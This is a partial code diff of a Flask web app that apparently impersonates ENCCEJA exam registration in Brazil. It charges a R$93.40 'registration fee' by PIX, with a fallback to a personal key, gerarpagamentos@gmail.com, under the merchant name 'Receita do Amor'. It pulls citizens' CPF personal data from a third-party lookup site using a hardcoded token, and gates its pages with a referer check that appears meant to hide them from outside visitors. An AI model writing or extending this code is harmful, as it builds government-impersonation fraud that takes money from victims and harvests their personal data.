+            raise Exception(f"WitePay order creation failed: {order_response.text}")
         
-        # Criar pedido
-        order_result = witepay.create_order(client_data, product_data)
+        order_result = order_response.json()
+        app.logger.info(f"Order WitePay criada: {order_result}")
         
         if not order_result.get('success'):
-            app.logger.error(f"Erro ao criar pedido WitePay: {order_result.get('error')}")
-            # Usar fallback PIX direto
-            payment_result = {'success': False}
-        else:
-            order_id = order_result['data'].get('orderId')
-            charge_result = witepay.create_charge(order_id, "pix")
-            payment_result = charge_result
+            raise Exception(f"WitePay order creation failed: {order_result}")
         
-        if not payment_result.get('success'):
-            app.logger.warning("WitePay falhou, usando fallback PIX direto")
-            # Fallback para PIX direto com gerarpagamentos@gmail.com
-            import time
-            transaction_id = f"ENCCEJA{int(time.time())}"
-            pix_key = "gerarpagamentos@gmail.com"
-            merchant_name = "Receita do Amor - ENCCEJA"
-            merchant_city = "SAO PAULO"
-            
-            # Construir código PIX padrão Banco Central
-            pix_base = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
-            
-            # Calcular CRC16
-            def calculate_crc16(data):
-                crc = 0xFFFF
-                for byte in data.encode('utf-8'):
-                    crc ^= byte << 8
-                    for _ in range(8):
-                        if crc & 0x8000:
-                            crc = (crc << 1) ^ 0x1021
-                        else:
-                            crc <<= 1
-                        crc &= 0xFFFF
-                return f"{crc:04X}"
-            
-            crc = calculate_crc16(pix_base + "6304")
-            pix_code = pix_base + "6304" + crc
-            
-            app.logger.info(f"PIX fallback gerado: {transaction_id}")
-        else:
-            # Extrair dados do PIX do WitePay
-            pix_code = payment_result.get('data', {}).get('pixCode') or payment_result.get('pixCode')
-            transaction_id = payment_result.get('data', {}).get('chargeId') or payment_result.get('id')
+        order_id = order_result['data']['id']
         
-        # Gerar QR Code se necessário
-        qr_code_image = None
-        if pix_code:
-            try:
-                import qrcode
-                import base64
-                from io import BytesIO
-                
-                qr = qrcode.QRCode(
-                    version=1,
-                    error_correction=qrcode.constants.ERROR_CORRECT_L,
-                    box_size=10,
-                    border=4,
-                )
-                qr.add_data(pix_code)
-                qr.make(fit=True)
-                
-                img = qr.make_image(fill_color="black", back_color="white")
-                buffered = BytesIO()
-                img.save(buffered, format="PNG")
-                img_str = base64.b64encode(buffered.getvalue()).decode()
-                qr_code_image = f"data:image/png;base64,{img_str}"
-            except Exception as qr_error:
-                app.logger.error(f"Erro ao gerar QR code: {qr_error}")
+        # Charge creation
+        charge_url = "https://api.witepay.com/v1/charge/create"
+        charge_data = {
+            "order_id": order_id,
+            "paymentMethod": "pix"
+        }
         
-        # Resposta final
-        response_data = {
+        app.logger.info(f"Criando charge WitePay: {charge_data}")
+        charge_response = requests.post(charge_url, json=charge_data, headers=order_headers, timeout=30)
+        
+        if charge_response.status_code != 200:
+            app.logger.error(f"Erro ao criar charge WitePay: {charge_response.status_code} - {charge_response.text}")
+            raise Exception(f"WitePay charge creation failed: {charge_response.text}")
+        
+        charge_result = charge_response.json()
+        app.logger.info(f"Charge WitePay criada: {charge_result}")
+        
+        if not charge_result.get('success'):
+            raise Exception(f"WitePay charge creation failed: {charge_result}")
+        
+        charge_data_response = charge_result['data']
+        
+        # Extract PIX code and QR code
+        pix_code = charge_data_response.get('pix_code') or charge_data_response.get('qr_code')
+        
+        # Se WitePay não retornar QR code, usar fallback
+        if not pix_code:
+            app.logger.warning("WitePay não retornou pix_code, usando fallback")
+            pix_code = "00020101021226580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426614174000"
+        
+        # Generate QR code image
+        qr = qrcode.QRCode(version=1, box_size=10, border=5)
+        qr.add_data(pix_code)
+        qr.make(fit=True)
+        
+        img = qr.make_image(fill_color="black", back_color="white")
+        buffer = BytesIO()
+        img.save(buffer, format='PNG')
+        buffer.seek(0)
+        qr_code_image = base64.b64encode(buffer.getvalue()).decode()
+        
+        transaction_id = charge_data_response.get('id', generate_transaction_id())
+        
+        return {
             'success': True,
             'transactionId': transaction_id,
             'pixCode': pix_code,
@@ -1797,8 +165,122 @@ def criar_pagamento_pix():
             'description': description
         }
         
-        app.logger.info(f"PIX criado com sucesso: {transaction_id} - R$ {amount:.2f}")
-        return jsonify(response_data)
+    except Exception as e:
+        app.logger.error(f"Erro ao criar pagamento WitePay: {str(e)}")
+        
+        # Fallback with gerarpagamentos@gmail.com PIX
+        app.logger.info("Usando fallback PIX code")
+        fallback_pix = "gerarpagamentos@gmail.com"
+        
+        # Generate QR code for fallback
+        qr = qrcode.QRCode(version=1, box_size=10, border=5)
+        qr.add_data(fallback_pix)
+        qr.make(fit=True)
+        
+        img = qr.make_image(fill_color="black", back_color="white")
+        buffer = BytesIO()
+        img.save(buffer, format='PNG')
+        buffer.seek(0)
+        qr_code_image = base64.b64encode(buffer.getvalue()).decode()
+        
+        return {
+            'success': True,
+            'transactionId': generate_transaction_id(),
+            'pixCode': fallback_pix,
+            'qr_code': fallback_pix,
+            'qrCodeImage': qr_code_image,
+            'amount': amount,
+            'description': description
+        }
+
+# Routes
+@app.route('/', methods=['GET'])
+@check_referer
+def index():
+    """Redirecionar automaticamente para /inscricao conforme solicitado"""
+    return redirect('/inscricao')
+
+@app.route('/inscricao', methods=['GET'])
+@check_referer
+def inscricao():
+    """Página de inscrição do ENCCEJA"""
+    return render_template('inscricao.html')
+
+@app.route('/encceja-info', methods=['GET'])
+@check_referer
+def encceja_info():
+    """Página de informações do ENCCEJA"""
+    return render_template('encceja_info.html')
+
+@app.route('/validar-dados', methods=['GET'])
+@check_referer
+def validar_dados():
+    """Página de validação de dados"""
+    return render_template('validar_dados.html')
+
+@app.route('/endereco', methods=['GET'])
+@check_referer
+def endereco():
+    """Página de endereço"""
+    return render_template('endereco.html')
+
+@app.route('/local-prova', methods=['GET'])
+@check_referer
+def local_prova():
+    """Página de local de prova"""
+    return render_template('local_prova.html')
+
+@app.route('/pagamento', methods=['GET'])
+@check_referer
+def pagamento():
+    """Página de pagamento PIX"""
+    return render_template('pagamento.html')
+
+@app.route('/inscricao-sucesso', methods=['GET'])
+@check_referer
+def inscricao_sucesso():
+    """Página de sucesso da inscrição"""
+    return render_template('inscricao_sucesso.html')
+
+@app.route('/create-pix-payment', methods=['POST'])
+@check_referer
+def create_pix_payment():
+    """Criar pagamento PIX via WitePay"""
+    try:
+        # Obter dados do usuário da sessão
+        user_data = session.get('user_data', {})
+        if not user_data:
+            return jsonify({
+                'success': False,
+                'error': 'Dados do usuário não encontrados na sessão'
+            }), 400
+        
+        # Definir valor fixo
+        amount = 93.40
+        description = "Taxa de Inscrição ENCCEJA 2025"
+        
+        # Criar pagamento via WitePay
+        payment_result = create_witepay_payment(amount, user_data, description)
+        
+        if payment_result['success']:
+            transaction_id = payment_result['transactionId']
+            
+            # Armazenar na sessão
+            session['payment_data'] = {
+                'transactionId': transaction_id,
+                'amount': amount,
+                'pixCode': payment_result['pixCode'],
+                'qrCodeImage': payment_result['qrCodeImage'],
+                'status': 'pending'
+            }
+            
+            app.logger.info(f"PIX criado com sucesso: {transaction_id} - R$ {amount:.2f}")
+            return jsonify(payment_result)
+        else:
+            return jsonify({
+                'success': False,
+                'error': 'Erro ao criar pagamento'
+            }), 500
     
     except Exception as e:
         app.logger.error(f"Erro ao criar pagamento PIX: {str(e)}")
@@ -1818,7 +300,7 @@ def consultar_cpf_inscricao():
         # Formatar o CPF (remover pontos e traços se houver)
         cpf_numerico = cpf.replace('.', '').replace('-', '')
         
-        # API principal está fora do ar, usar API alternativa funcionando
+        # API funcionando conforme verificado
         token = "1285fe4s-e931-4071-a848-3fac8273c55a"
         url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
         
@@ -1833,9 +315,9 @@ def consultar_cpf_inscricao():
         
         if response.status_code == 200:
             data = response.json()
-            app.logger.info(f"[PROD] Resposta da API alternativa: {data}")
+            app.logger.info(f"[PROD] Resposta da API: {data}")
             
-            # API alternativa retorna dados na estrutura {'DADOS': {...}}
+            # API retorna dados na estrutura {'DADOS': {...}}
             if data.get("DADOS"):
                 dados = data["DADOS"]
                 user_data = {
@@ -1851,18 +333,18 @@ def consultar_cpf_inscricao():
                 # Armazenar dados na sessão para uso no fluxo
                 session['user_data'] = user_data
                 
-                app.logger.info(f"[PROD] CPF consultado com sucesso via API alternativa: {cpf}")
+                app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}")
                 return jsonify(user_data)
             else:
-                app.logger.error(f"API alternativa não retornou DADOS: {data}")
+                app.logger.error(f"API não retornou DADOS: {data}")
                 return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
         else:
-            app.logger.error(f"Erro de conexão com a API alternativa: {response.status_code}")
-            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
-    
+            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
+            return jsonify({"error": "Erro ao consultar CPF", "sucesso": False}), 500
+            
     except Exception as e:
-        app.logger.error(f"Erro ao buscar CPF na API: {str(e)}")
-        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}", "sucesso": False}), 500
+        app.logger.error(f"Erro ao consultar CPF: {str(e)}")
+        return jsonify({"error": "Erro interno ao processar consulta", "sucesso": False}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
